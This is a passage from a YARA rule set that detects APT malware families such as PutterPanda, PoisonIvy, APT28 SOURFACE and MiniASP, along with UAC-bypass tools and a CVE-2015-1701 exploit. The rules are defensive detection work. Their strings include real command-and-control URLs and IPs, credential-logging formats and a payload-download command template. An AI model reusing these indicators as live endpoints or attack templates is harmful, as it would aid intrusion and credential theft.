      $s7 = "091A1G1R1_1g1u1z1" fullword ascii
      $s8 = "gHsMZz" fullword ascii
      $s9 = "Microsoft Media Device Service Provider" fullword wide
      $s10 = "Copyright (C) Microsoft Corp." fullword wide
      $s11 = "MFC42.DLL" fullword ascii
      $s12 = "MSVCRT.dll" fullword ascii
      $s13 = "SpecialBuild" fullword wide
      $s14 = "PrivateBuild" fullword wide
      $s15 = "Comments" fullword wide
      $s16 = "040904b0" fullword wide
      $s17 = "LegalTrademarks" fullword wide
      $s18 = "CreateThread" fullword ascii
      $s19 = "ntdll.dll" fullword ascii
      $s20 = "_adjust_fdiv" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them
} 

rule APT_Malware_PutterPanda_Rel_2_RID31F8 : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "APT Malware related to PutterPanda Group"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 13:45:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?" fullword ascii
      $s1 = "http://update.konamidata.com/test/zl/sophos/td/index.dat?" fullword ascii
      $s2 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii
      $s3 = "Internet connect error:%d" fullword ascii
      $s4 = "Proxy-Authorization:Basic" fullword ascii
      $s5 = "HttpQueryInfo failed:%d" fullword ascii
      $s6 = "read file error:%d" fullword ascii
      $s7 = "downdll.dll" fullword ascii
      $s8 = "rz.dat" fullword ascii
      $s9 = "Invalid url" fullword ascii
      $s10 = "Create file failed" fullword ascii
      $s11 = "myAgent" fullword ascii
      $s12 = "%s%s%d%d" fullword ascii
      $s13 = "down file success" fullword ascii
      $s15 = "error!" fullword ascii
      $s18 = "Avaliable data:%u bytes" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and 6 of them
} 

rule PoisonIvy_Sample_APT_4_RID2F59 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects a PoisonIvy Sample APT"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 11:53:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft Software installation Service" fullword wide
      $s1 = "idll.dll" fullword ascii
      $s2 = "mgmts.dll" fullword wide
      $s3 = "Microsoft(R) Windows(R)" fullword wide
      $s4 = "ServiceMain" fullword ascii
      $s5 = "Software installation Service" fullword wide
      $s6 = "SetServiceStatus" fullword ascii
      $s7 = "OriginalFilename" fullword wide
      $s8 = "ZwSetInformationProcess" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 7 of them
} 

rule PoisonIvy_Sample_5_RID2E16 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects PoisonIvy RAT sample set"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 10:59:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft Software installation Service" fullword wide
      $s2 = "pidll.dll" fullword ascii
      $s3 = "\\mspmsnsv.dll" fullword ascii
      $s4 = "\\sfc.exe" fullword ascii
      $s13 = "ServiceMain" fullword ascii
      $s15 = "ZwSetInformationProcess" fullword ascii
      $s17 = "LookupPrivilegeValueA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule PoisonIvy_Sample_6_RID2E17 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects PoisonIvy RAT sample set"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 10:59:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "124.133.252.150" fullword ascii
      $x3 = "http://124.133.254.171/up/up.asp?id=%08x&pcname=%s" fullword ascii
      $z1 = "\\temp\\si.txt" fullword ascii
      $z2 = "Daemon Dynamic Link Library" fullword wide
      $z3 = "Microsoft Windows CTF Loader" fullword wide
      $z4 = "\\tappmgmts.dll" fullword ascii
      $z5 = "\\appmgmts.dll" fullword ascii
      $s0 = "%USERPROFILE%\\AppData\\Local\\Temp\\Low\\ctfmon.log" fullword ascii
      $s1 = "%USERPROFILE%\\AppData\\Local\\Temp\\ctfmon.tmp" fullword ascii
      $s2 = "\\temp\\ctfmon.tmp" fullword ascii
      $s3 = "SOFTWARE\\Classes\\http\\shell\\open\\commandV" fullword ascii
      $s4 = "CONNECT %s:%i HTTP/1.0" fullword ascii
      $s5 = "start read histry key" fullword ascii
      $s6 = "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"" fullword ascii
      $s7 = "[password]%s" fullword ascii
      $s8 = "Daemon.dll" fullword ascii
      $s9 = "[username]%s" fullword ascii
      $s10 = "advpack" fullword ascii
      $s11 = "%s%2.2X" fullword ascii
      $s12 = "advAPI32" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 8 of ( $s* ) ) or ( 1 of ( $z* ) and 3 of ( $s* ) )
} 

rule APT_Malware_PutterPanda_PSAPI_RID31C1 : APT DEMO EXE FILE G0024 MAL T1086 T1136 {
   meta:
      description = "Detects a malware related to Putter Panda"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LOADER ERROR" fullword ascii
      $s1 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
      $s2 = "psapi.dll" fullword ascii
      $s3 = "urlmon.dll" fullword ascii
      $s4 = "WinHttpGetProxyForUrl" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule APT_Malware_PutterPanda_WUAUCLT_RID3269 : APT DEMO G0024 MAL T1136 {
   meta:
      description = "Detects a malware related to Putter Panda"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 14:04:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x0 = "WUAUCLT.EXE" fullword wide
      $x1 = "%s\\tmp%d.exe" fullword ascii
      $x2 = "Microsoft Corporation. All rights reserved." fullword wide
      $s1 = "Microsoft Windows Operating System" fullword wide
      $s2 = "InternetQueryOptionA" fullword ascii
      $s3 = "LookupPrivilegeValueA" fullword ascii
      $s4 = "WNetEnumResourceA" fullword ascii
      $s5 = "HttpSendRequestExA" fullword ascii
      $s6 = "PSAPI.DLL" fullword ascii
      $s7 = "Microsoft(R) Windows(R) Operating System" fullword wide
      $s8 = "CreatePipe" fullword ascii
      $s9 = "EnumProcessModules" fullword ascii
   condition: 
      all of ( $x* ) or ( 1 of ( $x* ) and all of ( $s* ) )
} 

rule PoisonIvy_Sample_7_RID2E18 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects PoisonIvy RAT sample set"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 10:59:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft Software installation Service" fullword wide
      $s2 = "pidll.dll" fullword ascii
      $s10 = "ServiceMain" fullword ascii
      $s11 = "ZwSetInformationProcess" fullword ascii
      $s12 = "Software installation Service" fullword wide
      $s13 = "Microsoft(R) Windows(R) Operating System" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule APT_Malware_PutterPanda_Gen1_RID318F : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects a malware "
      author = "Florian Roth"
      reference = "not set"
      date = "2015-06-03 13:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s%duserid=%dthreadid=%dgroupid=%d" fullword ascii
      $s2 = "ssdpsvc.dll" fullword ascii
      $s3 = "Fail %s " fullword ascii
      $s4 = "%s%dpara1=%dpara2=%dpara3=%d" fullword ascii
      $s5 = "LsaServiceInit" fullword ascii
      $s6 = "%-8d Fs %-12s Bs " fullword ascii
      $s7 = "Microsoft DH SChannel Cryptographic Provider" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them
} 

rule Malware_MsUpdater_String_in_EXE_RID331B : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "MSUpdater String in Executable"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 14:33:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "msupdate.exe" fullword wide
      $x3 = "msupdater.exe" fullword ascii
      $x4 = "msupdater32.exe" fullword ascii
      $x5 = "msupdater32.exe" fullword wide
      $x6 = "msupdate.pif" fullword ascii
      $fp1 = "_msupdate_" wide
      $fp2 = "_msupdate_" ascii
      $fp3 = "/kies" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) ) and not ( 1 of ( $fp* ) )
} 

rule APT_Malware_PutterPanda_MsUpdater_3_RID346B : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects Malware related to PutterPanda - MSUpdater"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 15:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "msupdater.exe" fullword ascii
      $s1 = "Explorer.exe \"" fullword ascii
      $s2 = "FAVORITES.DAT" fullword ascii
      $s4 = "COMSPEC" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and 3 of them
} 

rule APT_Malware_PutterPanda_MsUpdater_1_RID3469 : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects Malware related to PutterPanda - MSUpdater"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 15:29:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x0 = "msupdate.exe" fullword wide
      $x1 = "msupdate" fullword wide
      $s1 = "Microsoft Corporation. All rights reserved." fullword wide
      $s2 = "Automatic Updates" fullword wide
      $s3 = "VirtualProtectEx" fullword ascii
      $s4 = "Invalid parameter" fullword ascii
      $s5 = "VirtualAllocEx" fullword ascii
      $s6 = "WriteProcessMemory" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) and 4 of ( $s* ) ) or ( 1 of ( $x* ) and all of ( $s* ) )
} 

rule APT_Malware_PutterPanda_MsUpdater_2_RID346A : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects Malware related to PutterPanda - MSUpdater"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 15:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "winsta0\\default" fullword ascii
      $s1 = "EXPLORER.EXE" fullword ascii
      $s2 = "WNetEnumResourceA" fullword ascii
      $s3 = "explorer.exe" fullword ascii
      $s4 = "CreateProcessAsUserA" fullword ascii
      $s5 = "HttpSendRequestExA" fullword ascii
      $s6 = "HttpEndRequestA" fullword ascii
      $s7 = "GetModuleBaseNameA" fullword ascii
      $s8 = "GetModuleFileNameExA" fullword ascii
      $s9 = "HttpSendRequestA" fullword ascii
      $s10 = "HttpOpenRequestA" fullword ascii
      $s11 = "InternetConnectA" fullword ascii
      $s12 = "Process32Next" fullword ascii
      $s13 = "Process32First" fullword ascii
      $s14 = "CreatePipe" fullword ascii
      $s15 = "EnumProcesses" fullword ascii
      $s16 = "LookupPrivilegeValueA" fullword ascii
      $s17 = "PeekNamedPipe" fullword ascii
      $s18 = "EnumProcessModules" fullword ascii
      $s19 = "PSAPI.DLL" fullword ascii
      $s20 = "SPSSSQ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them
} 

rule APT_Malware_PutterPanda_Gen4_RID3192 : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects Malware related to PutterPanda"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 13:28:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "rz.dat" fullword ascii
      $s0 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii
      $s1 = "Internet connect error:%d" fullword ascii
      $s2 = "Proxy-Authorization:Basic " fullword ascii
      $s5 = "Invalid url" fullword ascii
      $s6 = "Create file failed" fullword ascii
      $s7 = "myAgent" fullword ascii
      $z1 = "%s%s%d%d" fullword ascii
      $z2 = "HttpQueryInfo failed:%d" fullword ascii
      $z3 = "read file error:%d" fullword ascii
      $z4 = "down file success" fullword ascii
      $z5 = "kPStoreCreateInstance" fullword ascii
      $z6 = "Avaliable data:%u bytes" fullword ascii
      $z7 = "abe2869f-9b47-4cd9-a358-c22904dba7f7" fullword ascii
   condition: 
      filesize < 300KB and ( ( uint16 ( 0 ) == 0x5a4d and $x1 and 3 of ( $s* ) ) or ( 3 of ( $s* ) and 4 of ( $z* ) ) )
} 

rule APT_Malware_CommentCrew_MiniASP_RID32B1 : APT DEMO EXE FILE G0006 MAL T1136 {
   meta:
      description = "CommentCrew Malware MiniASP APT"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 14:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0006, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\MiniAsp4\\Release\\MiniAsp.pdb" ascii
      $x2 = "run http://%s/logo.png setup.exe" fullword ascii
      $x3 = "d:\\command.txt" fullword ascii
      $z1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR " ascii
      $z2 = "Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)" fullword ascii
      $z3 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC" ascii
      $s1 = "http://%s/device_command.asp?device_id=%s&cv=%s&command=%s" fullword ascii
      $s2 = "kill process error!" fullword ascii
      $s3 = "kill process success!" fullword ascii
      $s4 = "pickup command error!" fullword ascii
      $s5 = "http://%s/record.asp?device_t=%s&key=%s&device_id=%s&cv=%s&result=%s" fullword ascii
      $s6 = "no command" fullword ascii
      $s7 = "software\\microsoft\\windows\\currentversion\\run" fullword ascii
      $s8 = "command is null!" fullword ascii
      $s9 = "pickup command Ok!" fullword ascii
      $s10 = "http://%s/result_%s.htm" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) or ( all of ( $z* ) ) or ( 8 of ( $s* ) )
} 

rule APT28_CHOPSTICK_RID2B67 : APT DEMO EXE FILE G0007 RUSSIA T1086 T1136 {
   meta:
      description = "Detects a malware that behaves like CHOPSTICK mentioned in APT28 report"
      author = "Florian Roth"
      reference = "https://goo.gl/v3ebal"
      date = "2015-06-02 09:05:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "jhuhugit.tmp" fullword ascii
      $s8 = "KERNEL32.dll" fullword ascii
      $s9 = "IsDebuggerPresent" fullword ascii
      $s10 = "IsProcessorFeaturePresent" fullword ascii
      $s11 = "TerminateProcess" fullword ascii
      $s13 = "DeleteFileA" fullword ascii
      $s15 = "GetProcessHeap" fullword ascii
      $s16 = "!This program cannot be run in DOS mode." fullword ascii
      $s17 = "LoadLibraryA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 722KB and all of them
} 

rule APT28_SourFace_Malware1_RID2F30 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server."
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html"
      date = "2015-06-01 11:46:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "coreshell.dll" fullword wide
      $s1 = "Core Shell Runtime Service" fullword wide
      $s2 = "\\chkdbg.log" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them
} 

rule APT28_SourFace_Malware2_RID2F31 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server."
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html"
      date = "2015-06-01 11:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "coreshell.dll" fullword ascii
      $s1 = "Applicate" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them
} 

rule APT28_SourFace_Malware3_RID2F32 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server."
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html"
      date = "2015-06-01 11:46:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "coreshell.dll" fullword wide
      $s1 = "Core Shell Runtime Service" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them
} 

rule SVG_LoadURL_RID2AD3 : DEMO EXPLOIT T1136 {
   meta:
      description = "Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)"
      author = "Florian Roth"
      reference = "http://goo.gl/psjCCc"
      date = "2015-05-24 08:43:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "</svg>" nocase
      $s2 = "<script>" nocase
      $s3 = "location.href='http" nocase
   condition: 
      all of ( $s* ) and filesize < 600
} 

rule DarkEYEv3_Cryptor_RID2D71 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Rule to detect DarkEYEv3 encrypted executables (often malware)"
      author = "Florian Roth"
      reference = "http://darkeyev3.blogspot.fi/"
      date = "2015-05-24 10:32:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\DarkEYEV3-" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s0
} 

rule MAL_PoisonIvy_Generic_3_RID2FA8 : DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "PoisonIvy RAT Generic Rule"
      author = "Florian Roth"
      reference = "-"
      date = "2015-05-14 12:06:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $k1 = "Tiger324{" fullword ascii
      $s2 = "WININET.dll" fullword ascii
      $s3 = "mscoree.dll" fullword wide
      $s4 = "WS2_32.dll" fullword
      $s5 = "Explorer.exe" fullword wide
      $s6 = "USER32.DLL" 
      $s7 = "CONOUT$" 
      $s8 = "login.asp" 
      $h1 = "HTTP/1.0" 
      $h2 = "POST" 
      $h3 = "login.asp" 
      $h4 = "check.asp" 
      $h5 = "result.asp" 
      $h6 = "upload.asp" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $k1 or all of ( $s* ) or all of ( $h* ) )
} 

rule APT17_Sample_FXSST_DLL_RID2E51 : APT DEMO EXE FILE G0025 T1136 {
   meta:
      description = "Detects Samples related to APT17 activity - file FXSST.DLL"
      author = "Florian Roth"
      reference = "https://goo.gl/ZiJyQv"
      date = "2015-05-14 11:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0025, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Microsoft? Windows? Operating System" fullword wide
      $x2 = "fxsst.dll" fullword ascii
      $y1 = "DllRegisterServer" fullword ascii
      $y2 = ".cSV" fullword ascii
      $s1 = "GetLastActivePopup" 
      $s2 = "Sleep" 
      $s3 = "GetModuleFileName" 
      $s4 = "VirtualProtect" 
      $s5 = "HeapAlloc" 
      $s6 = "GetProcessHeap" 
      $s7 = "GetCommandLine" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( all of ( $x* ) or all of ( $y* ) ) and all of ( $s* )
} 

rule UACME_Akagi_RID2AB8 : DEMO HKTL T1088 T1136 {
   meta:
      description = "Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor"
      author = "Florian Roth"
      reference = "https://github.com/hfiref0x/UACME"
      date = "2015-05-14 07:58:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "UACMe injected, Fubuki at your service." wide fullword
      $x3 = "%temp%\\Hibiki.dll" fullword wide
      $x4 = "[UCM] Cannot write to the target process memory." fullword wide
      $s1 = "%systemroot%\\system32\\cmd.exe" wide
      $s2 = "D:(A;;GA;;;WD)" wide
      $s3 = "%systemroot%\\system32\\sysprep\\sysprep.exe" fullword wide
      $s4 = "/c wusa %ws /extract:%%windir%%\\system32" fullword wide
      $s5 = "Fubuki.dll" ascii fullword
      $l1 = "ntdll.dll" ascii
      $l2 = "Cabinet.dll" ascii
      $l3 = "GetProcessHeap" ascii
      $l4 = "WriteProcessMemory" ascii
      $l5 = "ShellExecuteEx" ascii
   condition: 
      ( 1 of ( $x* ) ) or ( 3 of ( $s* ) and all of ( $l* ) )
} 

rule UACElevator_RID2B2C : DEMO EXE FILE HKTL T1088 T1136 {
   meta:
      description = "UACElevator_RID2B2C bypassing UAC - file UACElevator_RID2B2C.exe"
      author = "Florian Roth"
      reference = "https://github.com/MalwareTech/UACElevator_RID2B2C"
      date = "2015-05-14 08:55:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\UACElevator_RID2B2C.pdb" ascii
      $s1 = "%userprofile%\\Downloads\\dwmapi.dll" fullword ascii
      $s2 = "%windir%\\system32\\dwmapi.dll" fullword ascii
      $s3 = "Infection module: %s" fullword ascii
      $s4 = "Could not save module to %s" fullword ascii
      $s5 = "%s%s%p%s%ld%s%d%s" fullword ascii
      $s6 = "Stack area around _alloca memory reserved by this function is corrupted" fullword ascii
      $s7 = "Stack around the variable '" fullword ascii
      $s8 = "MSVCR120D.dll" fullword wide
      $s9 = "Address: 0x" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 172KB and ( $x1 or 8 of ( $s* ) )
} 

rule CVE_2015_1701_Taihou_RID2D07 : DEMO EXE EXPLOIT FILE T1068 T1136 {
   meta:
      description = "CVE-2015-1701 compiled exploit code"
      author = "Florian Roth"
      reference = "http://goo.gl/W4nU0q"
      date = "2015-05-13 10:14:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "VirtualProtect" fullword
      $s4 = "RegisterClass" 
      $s5 = "LoadIcon" 
      $s6 = "PsLookupProcessByProcessId" fullword ascii
      $s7 = "LoadLibraryExA" fullword ascii
      $s8 = "gSharedInfo" fullword
      $w1 = "user32.dll" wide
      $w2 = "ntdll" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of ( $s* ) and 1 of ( $w* )
} 

rule MAL_Rombertik_CarbonGrabber_RID3162 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects CarbonGrabber alias Rombertik - file Copy#064046.scr"
      author = "Florian Roth"
      reference = "http://blogs.cisco.com/security/talos/rombertik"
      date = "2015-05-05 13:20:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ZwGetWriteWatch" fullword ascii
      $x2 = "OutputDebugStringA" fullword ascii
      $x3 = "malwar" fullword ascii
      $x4 = "sampl" fullword ascii
      $x5 = "viru" fullword ascii
      $x6 = "sandb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and all of them
} 

rule MAL_Rombertik_CarbonGrabber_Builder_Server_RID375E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects CarbonGrabber alias Rombertik Builder Server - file Server.exe"
      author = "Florian Roth"
      reference = "http://blogs.cisco.com/security/talos/rombertik"
      date = "2015-05-05 17:35:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\WINDOWS\\system32\\svchost.exe" fullword ascii
      $s3 = "Software\\Microsoft\\Windows\\Currentversion\\RunOnce" fullword ascii
      $s4 = "chrome.exe" fullword ascii
      $s5 = "firefox.exe" fullword ascii
      $s6 = "chrome.dll" fullword ascii
      $s7 = "@KERNEL32.DLL" fullword wide
      $s8 = "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome" ascii
      $s10 = "&post=" fullword ascii
      $s11 = "&host=" fullword ascii
      $s12 = "Ws2_32.dll" fullword ascii
      $s16 = "&browser=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 8 of them
} 

rule Explosion_Sample_2_RID2E24 : APT DEMO FILE T1136 {
   meta:
      description = "Explosion/Explosive Malware - Volatile Cedar APT"
      author = "Florian Roth"
      reference = "http://goo.gl/5vYaNb"
      date = "2015-04-03 11:01:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "serverhelp.dll" fullword wide
      $s1 = "Windows Help DLL" fullword wide
      $s5 = "SetWinHoK" fullword ascii
   condition: 
      all of them and uint16 ( 0 ) == 0x5A4D
} 

rule APT30_Sample_6_RID2BAF : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GreateProcessA" fullword ascii
      $s1 = "Ternel32.dll" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_B_RID2C16 : APT DEMO FILE G0013 GEN T1136 {
   meta:
